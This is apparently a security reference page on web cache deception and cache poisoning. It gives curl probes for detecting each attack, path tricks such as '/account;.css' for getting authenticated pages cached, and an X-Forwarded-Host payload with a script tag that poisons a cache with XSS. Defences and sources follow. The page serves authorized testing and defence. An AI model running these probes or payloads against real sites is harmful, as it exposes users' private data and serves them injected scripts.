# Web Cache Deception & Cache Poisoning

> Cache and origin disagree on the cache key → personal/authenticated responses get cached under URLs other users hit. Authorized testing only. Map: CWE-444 (related, smuggling-adjacent), CWE-524.

## TL;DR
- Two flavours:
  - **Cache deception** (Omer Gil, 2017): attacker tricks the cache into storing a victim's authenticated response by appending a "static-looking" path segment that the origin ignores but the cache treats as a cacheable extension.
  - **Cache poisoning**: attacker fills the cache with a response that includes attacker-controlled content (often via unkeyed input — a header the origin reflects into the response but the cache doesn't include in the key).
- Both exploit cache-vs-origin parser/key mismatch. Common CDNs in mix: Cloudflare, Akamai, Fastly, CloudFront, Varnish.
- Defence: align cache-key and origin-URL parsing; never cache personalised responses; explicit `Cache-Control: private` on authenticated routes; identify and key on every header that affects response content.

## Detection / Discovery

### Cache deception probe
```bash
# Authenticated request to a personal page (typically returns user data)
curl -i -b "session=<your-cookie>" https://target/account
# Now append a "static" suffix the origin will trim or ignore
curl -i -b "session=<your-cookie>" https://target/account/foo.css
# If the second responds with your account content AND a cache hit indicator (X-Cache: HIT,
# Age > 0, CF-Cache-Status: HIT), the cache stored your account under /account/foo.css.
# Subsequent unauthenticated GETs of the same URL by anyone return your data.
```

### Cache poisoning probe (unkeyed header)
```bash
# 1. Send normal request, save baseline
curl -i https://target/page

# 2. Add a header the origin reflects (X-Forwarded-Host is the classic):
curl -i -H "X-Forwarded-Host: evil.com" https://target/page
# If the response body or a header contains evil.com, that input was reflected.

# 3. Repeat the second request multiple times -- does the cache return the poisoned response
#    for a clean (no-attacker-header) request? If yes -> poisoning confirmed.
curl -i https://target/page   # no header now; check for "evil.com" in response
```

PortSwigger's **Param Miner** (Burp extension) automates discovery of unkeyed inputs.

## Exploitation

### Cache deception — variants
| URL trick | Why it works |
| --- | --- |
| `/account/foo.css` | Origin routes by `/account`; cache rules include `.css → cache`. |
| `/account;.css` | Origin treats `;` as path delimiter (PHP, some Java); cache sees full string ending `.css`. |
| `/account/%2e.css` | URL-encoded `.` to defeat normalization gaps. |
| `/account/foo.css?` | Trailing `?` quirks. |
| `/api/me/avatar.svg` | When origin returns the avatar but cache-rules include SVG. |

After cache stores the personal response, attacker sends the same URL → reads the victim's content.

### Cache poisoning — unkeyed-header → reflected-XSS
1. Origin reflects `X-Forwarded-Host` into a meta-refresh tag or canonical link.
2. Cache key is `(method, scheme, host, path, query)` — `X-Forwarded-Host` not in key.
3. Attacker sends `GET /page` with `X-Forwarded-Host: evil.com"><script>alert(1)</script><"`. Origin renders `<meta http-equiv=refresh content="...evil.com..."><script>alert(1)</script>` and caches.
4. Subsequent victim requests `GET /page` → served from cache → XSS fires.

### CL.0 / 0.CL → cache poisoning chain
Once you have request smuggling (see [./http-request-smuggling.md](./http-request-smuggling.md)), poison the cache by smuggling a request whose response body the cache stores against another URL's key.

### Cache key normalisation tricks
- `GET /page?` and `GET /page` may cache to the same key — confirm and use one as the poisoning vector.
- Mixed-case `GET /Page` vs `/page` — depends on cache config.
- Trailing slash: `/page` vs `/page/`.
- Fragment is never sent to server — irrelevant for both attacker and defender.

## Bypasses (defender misconfigurations)
- Cache emits `Vary: Cookie` but only for some endpoints — the un-Vary'd ones are poisonable.
- `Cache-Control: no-store` set on response but only by some origin paths — paths not hitting that origin component cache freely.
- CDN-level rule "cache all `.css`" but the origin sometimes returns `.css` content with `Content-Type: text/html` (CSS-injection territory) — cache trusts extension, doesn't validate Content-Type.

## Defence / Remediation
- **Don't cache personalised responses**. Authenticated routes must emit `Cache-Control: private, no-store` and the CDN must honor it.
- **Align cache-key with origin parser**. If origin treats `;` as path delimiter, the cache must too — or you must trim before forwarding.
- **Normalize URLs** at the edge (canonical path, decoded percent-encodings) before cache lookup.
- **`Vary:` every header that affects response content** (`Vary: Accept-Encoding, Cookie, Authorization, X-Forwarded-Host` etc.) — but the safer pattern is "don't reflect headers into responses at all".
- **Don't reflect `Host` / `X-Forwarded-Host` / `X-Forwarded-Proto` / `Forwarded`** into response bodies or absolute-URL headers. Use server-side configured base URL instead.
- **Strip request headers** before forwarding to origin if the CDN ingests them as cache-keys vs the origin uses different ones (Cloudflare's "Transform Rules", Fastly VCL).
- **Test in CI** — known-vulnerable patterns can be regression-checked: send a request with `X-Forwarded-Host: cache-poison-probe.test` and assert the response doesn't contain that string.

## Sources
- Omer Gil — "Web Cache Deception attack" (2017): https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- James Kettle — "Practical Web Cache Poisoning" (DEF CON 26 / Black Hat USA 2018): https://portswigger.net/research/practical-web-cache-poisoning
- James Kettle — "Web Cache Entanglement" (2020): https://portswigger.net/research/web-cache-entanglement
- PortSwigger Web Security Academy — Web cache poisoning: https://portswigger.net/web-security/web-cache-poisoning
- PortSwigger — Web cache deception: https://portswigger.net/web-security/web-cache-deception
- Param Miner (Burp extension): https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
- HackTricks cache poisoning: https://book.hacktricks.wiki/en/pentesting-web/cache-deception/index.html
- CWE-524 Use of Cache Containing Sensitive Information: https://cwe.mitre.org/data/definitions/524.html
